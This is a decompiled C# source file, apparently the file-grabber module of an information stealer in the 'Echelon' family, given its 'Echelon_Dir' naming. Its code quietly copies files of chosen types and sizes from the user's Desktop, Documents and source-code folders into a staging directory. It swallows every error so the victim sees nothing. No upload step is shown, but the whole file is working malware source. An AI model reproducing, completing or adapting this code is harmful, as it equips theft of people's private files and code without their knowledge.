using System;
using System.Collections.Generic;
using System.IO;

namespace Mist
{
	// Token: 0x0200004F RID: 79
	public class Files
	{
		// Token: 0x06000220 RID: 544 RVA: 0x0001003C File Offset: 0x0000E23C
		public static void GetFiles(string Echelon_Dir)
		{
			try
			{
				string text = Echelon_Dir + "\\Files";
				Directory.CreateDirectory(text);
				if (!Directory.Exists(text))
				{
					Files.GetFiles(text);
				}
				else
				{
					Files.CopyDirectory(Help.DesktopPath, text, "*.*", (long)Program.sizefile);
					Files.CopyDirectory(Help.MyDocuments, text, "*.*", (long)Program.sizefile);
					Files.CopyDirectory(Help.UserProfile + "\\source", text, "*.*", (long)Program.sizefile);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000221 RID: 545 RVA: 0x000100D0 File Offset: 0x0000E2D0
		private static long GetDirSize(string path, long size = 0L)
		{
			try
			{
				foreach (string fileName in Directory.EnumerateFiles(path))
				{
					try
					{
						size += new FileInfo(fileName).Length;
					}
					catch
					{
					}
				}
				foreach (string path2 in Directory.EnumerateDirectories(path))
				{
					try
					{
						size += Files.GetDirSize(path2, 0L);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return size;
		}

		// Token: 0x06000222 RID: 546 RVA: 0x0001019C File Offset: 0x0000E39C
		public static void CopyDirectory(string source, string target, string pattern, long maxSize)
		{
			Stack<GetFiles.Folders> stack = new Stack<GetFiles.Folders>();
			stack.Push(new GetFiles.Folders(source, target));
			long num = Files.GetDirSize(target, 0L);
			while (stack.Count > 0)
			{
				GetFiles.Folders folders = stack.Pop();
				try
				{
					Directory.CreateDirectory(folders.Target);
					foreach (string text in Directory.EnumerateFiles(folders.Source, pattern))
					{
						try
						{
							if (Array.IndexOf<string>(Program.expansion, Path.GetExtension(text).ToLower()) >= 0)
							{
								string text2 = Path.Combine(folders.Target, Path.GetFileName(text));
								if (new FileInfo(text).Length / 1024L < 5000L)
								{
									File.Copy(text, text2);
									num += new FileInfo(text2).Length;
									if (num > maxSize)
									{
										return;
									}
									Files.count++;
								}
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (PathTooLongException)
				{
					continue;
				}
				try
				{
					foreach (string text3 in Directory.EnumerateDirectories(folders.Source))
					{
						try
						{
							if (!text3.Contains(Path.Combine(Help.DesktopPath, Environment.UserName)))
							{
								stack.Push(new GetFiles.Folders(text3, Path.Combine(folders.Target, Path.GetFileName(text3))));
							}
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch (DirectoryNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
			}
			stack.Clear();
		}

		// Token: 0x0400011A RID: 282
		public static int count;
	}
}
